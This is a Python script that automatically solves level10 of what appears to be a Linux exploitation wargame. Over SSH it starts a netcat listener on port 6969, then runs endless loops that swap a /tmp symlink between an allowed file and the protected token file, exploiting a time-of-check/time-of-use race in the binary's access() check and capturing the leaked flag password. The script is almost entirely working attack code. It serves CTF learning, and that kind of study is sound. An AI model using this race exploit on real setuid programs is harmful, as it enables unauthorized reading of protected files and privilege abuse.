import os
import subprocess
import sys
import time

sys.path.append("../..")

from utils.ssh import connect_by_previous, exec, get_current_level, get_previous_password, get_token, \
    VM_ADDRESS, VM_PORT
from utils.text import print_title, print_output, print_action, print_magic

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list)

output = exec(client, './level10', title='Execute binary')
print_output(output, 'Output')
print_title('We must put file and host, ok')

output = exec(client, './level10 token 0.0.0.0', title='Put token')
print_output(output, 'Output')
print_title("Can't read this file, sad")

output = exec(client, 'echo test > /tmp/test && ./level10 /tmp/test 0.0.0.0', title='Put test file')
print_output(output, 'Output')
print_title("Binary connect to 6969 port, sniff it")

dev_null = open(os.devnull, 'w')
connect_command = f'sshpass -p {get_previous_password()} ssh {get_current_level()}@{VM_ADDRESS} -p {VM_PORT} ' \
                  f'-oStrictHostKeyChecking=no'

print_title('Sniff 6969 port')
command = f"{connect_command} nc -lk 6969"
stream = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE, stdin=dev_null, stderr=dev_null)
print_action(command)

print_title('Wait a little before terminal loading')
time.sleep(10)

output = exec(client, './level10 /tmp/test 0.0.0.0', title='Put test file again')
print_output(output, 'Output')
print_title('Works! Time to break it!')

output = exec(client, 'nm -u level10 | awk "/access|connect/"', title='Reverse binary a little')
print_output(output, 'Interested thing')

output = exec(client, 'man access | less +/NOTES | cat | grep -A 6 "Warning"', title='Check access man')
print_output(output)
print_title("Try to abuse interval?")

print_magic('Oh, time to magic~')

print_title('Infinite symbol link create')
command = f"{connect_command} while true; do ln -fs ~/level10 /tmp/tricky_thing; ln -fs ~/token /tmp/tricky_thing; done"
a = subprocess.Popen(command.split(" "), stdout=dev_null, stderr=dev_null, stdin=dev_null)
print_action(command)

print_title('Execute binary in loop')
command = f"{connect_command} while true; do ./level10 /tmp/tricky_thing 0.0.0.0; done"
b = subprocess.Popen(command.split(" "), stdout=dev_null, stdin=dev_null, stderr=dev_null)
print_action(command)

print_title('Wait until race condition do it for us...')

flag_password = None


def cleanup():
    a.terminate()
    b.terminate()
    stream.terminate()
    print_action('Terminate processes')
    exec(client, 'killall nc')
    exec(client, 'rm -f /tmp/tricky_thing', title='Remove tmp file')
    exec(client, 'rm -f /tmp/test', title='Remove tmp file')


while True:
    try:
        flag_password = stream.stdout.readline().decode('utf-8').strip()
        if flag_password:
            if 'Connecting' not in flag_password \
                    and '.*( )*.' not in flag_password \
                    and 'test' not in flag_password \
                    and 'send' not in flag_password \
                    and 'Connected!' not in flag_password \
                    and 'wrote' not in flag_password \
                    and 'Unable' not in flag_password:
                break
    except UnicodeDecodeError as err:
        continue
    except KeyboardInterrupt:
        cleanup()
        exit()

print_output(flag_password, 'Flag password')
print_title('Woo-hoo!')

cleanup()

get_token(flag_password)

client.close()
